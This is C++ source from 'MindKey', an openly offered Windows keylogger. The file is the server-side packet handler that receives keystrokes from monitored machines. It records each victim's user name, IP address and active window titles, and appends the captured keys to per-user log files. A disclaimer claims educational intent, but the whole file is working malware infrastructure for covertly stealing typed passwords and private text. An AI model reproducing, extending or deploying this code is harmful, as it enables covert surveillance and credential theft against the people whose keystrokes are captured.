/* MindKey, Keylogger for Windows.
* While this program can potentially be used for nefarious purposes,
* it was written for educational and recreational purposes only
* and the author does not endorse illegal use.
*
* Copyright (C) 2013 - 2014 Blackhack <https://github.com/blackhack/MindKey/>
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include "common.hpp"
#include "PacketMgr.h"

#define Callback(function) std::bind(&PacketMgr::function, this, std::placeholders::_1, std::placeholders::_2)

void PacketMgr::InitializeHandlers()
{
    _packetsCallback =
    {
        { PACKET_UNK,          Callback(UnkPacketHandler) },
        { PACKET_KEYLOGGER,    Callback(KeyloggerHandler) },
    };
}

void PacketMgr::UnkPacketHandler(PacketStruct& _recvData, ConnectionPtr _connection)
{
    std::cout << "Unk packet: " << _recvData.Id << std::endl;
}

// Only allow filename with ascii chars.
void checkFileName(std::string &str)
{
    for (std::string::size_type i = 0; i < str.size(); ++i)
    {
        if (str[i] > char(127))
            str[i] = char(95);
    }
}

void PacketMgr::KeyloggerHandler(PacketStruct& _recvData, ConnectionPtr _connection)
{
    if (_recvData.Data.empty())
        return;

    std::string User = _recvData.Data[0];
    std::string fileName = User + ".txt";
    checkFileName(fileName);

    std::cout << "Update file: " << fileName.c_str() << "\n";

    std::ofstream myfile;
    myfile.open(fileName.c_str(), std::ios::out | std::ios::app);

    std::string last_window_title = _recvData.Data[1];

    myfile << "----- BEGIN DATA, DATE: " << TimeStamp() << " -----\n";
    myfile << "From: " << _connection->socket().remote_endpoint().address().to_string() << "\n";
    myfile << "Title: " << last_window_title << "\n";
    myfile << "Data: ";

    for (uint32_t i = 0; i < _recvData.Data.size(); i+=3)
    {
        std::string window_title = _recvData.Data[i+1];
        std::string key = _recvData.Data[i+2];

        std::cout << "Key: " << key << std::endl;

        if (window_title == last_window_title)
            myfile << key;
        else
        {
            myfile << "\n----------\n";
            myfile << "Title: " << window_title << "\n";
            myfile << "Data: " << key;
            last_window_title = window_title;
        }
    }

    myfile << "\n----- END DATA -----\n\n";

    myfile.close();
}


bool PacketMgr::HandlePacket(std::vector<PacketStruct> data, ConnectionPtr connection)
{
    for (auto &packet : data)
    {
        if (_packetsCallback.find(packet.Id) != _packetsCallback.end())
            _packetsCallback[packet.Id](packet, connection);
        else
            UnkPacketHandler(packet, connection);
    }

    return true;
}
